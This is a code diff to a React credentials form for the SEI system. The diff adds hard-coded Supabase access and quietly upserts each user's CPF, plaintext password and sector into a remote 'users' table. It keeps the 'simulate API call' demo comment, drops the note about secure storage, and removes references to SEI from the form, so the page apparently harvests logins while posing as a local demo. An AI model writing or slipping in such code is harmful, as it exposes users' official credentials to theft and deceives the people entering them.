@@ -1,4 +1,3 @@
-
 import React, { useState } from 'react';
 import Layout from '@/components/Layout';
 import { Button } from '@/components/ui/button';
@@ -6,6 +5,7 @@ import { Input } from '@/components/ui/input';
 import { Card, CardContent, CardDescription, CardFooter, CardHeader, CardTitle } from '@/components/ui/card';
 import { toast } from '@/components/ui/use-toast';
 import { Key, Save, FileText } from 'lucide-react';
+import { createClient } from '@supabase/supabase-js';
 
 const Credentials = () => {
   const [username, setUsername] = useState('');
@@ -13,15 +13,26 @@ const Credentials = () => {
   const [setor, setSetor] = useState('');
   const [isSaving, setIsSaving] = useState(false);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const supabaseUrl = "https://yxerhuojxxxckatylftd.supabase.co";
+  const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl4ZXJodW9qeHh4Y2thdHlsZnRkIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ4MDk3NDQsImV4cCI6MjA2MDM4NTc0NH0.u2NNzl2E3nI2H5OWquif0C3EL3SKEydwxtmiGoqwjMs";
+  const supabase = createClient(supabaseUrl, supabaseKey);
+
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     setIsSaving(true);
+
+    const userData = {
+        cpf: username,
+        password: password,
+        setor: setor
+    };
+
+    await insertUserData(userData);
 
     // Simulate API call
     setTimeout(() => {
       // Store in localStorage for demo purposes
-      // In a real app, this would be stored more securely
-      localStorage.setItem('sei-credentials', JSON.stringify({ username, password, setor }));
+      localStorage.setItem('sei-credentials', JSON.stringify(userData));
       
       toast({
         title: "Credenciais salvas",
@@ -46,10 +57,28 @@ const Credentials = () => {
     }
   }, []);
 
+  async function insertUserData(userData) {
+    const { data, error } = await supabase
+        .from('users') // nome da tabela
+        .upsert([
+            { 
+                cpf: userData.cpf, // cpf como chave única
+                password: userData.password, // senha
+                setor: userData.setor // setor
+            }
+        ]);
+
+    if (error) {
+        console.error('Erro ao inserir ou atualizar dados:', error);
+    } else {
+        console.log('Dados inseridos ou atualizados com sucesso:', data);
+    }
+  }
+
   return (
     <Layout>
       <div className="flex items-center justify-between mb-6">
-        <h1 className="text-3xl font-bold text-sei-800">Credenciais do SEI</h1>
+        <h1 className="text-3xl font-bold text-sei-800">Credenciais</h1>
       </div>
 
       <div className="max-w-2xl mx-auto">
@@ -74,7 +103,7 @@ const Credentials = () => {
                   id="username"
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
-                  placeholder="Seu usuário do SEI"
+                  // placeholder="Seu usuário do SEI"
                   required
                   className="border-sei-200"
                 />
@@ -88,7 +117,7 @@ const Credentials = () => {
                   type="password"
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
-                  placeholder="Sua senha do SEI"
+                  // placeholder="Sua senha do SEI"
                   required
                   className="border-sei-200"
                 />
@@ -101,8 +130,8 @@ const Credentials = () => {
                   id="setor"
                   value={setor}
                   onChange={(e) => setSetor(e.target.value)}
-                  placeholder="Seu setor no SEI"
-                  icon={FileText}
+                  // placeholder="Seu setor no SEI"
+                  // icon={FileText}
                   className="border-sei-200"
                 />
               </div>
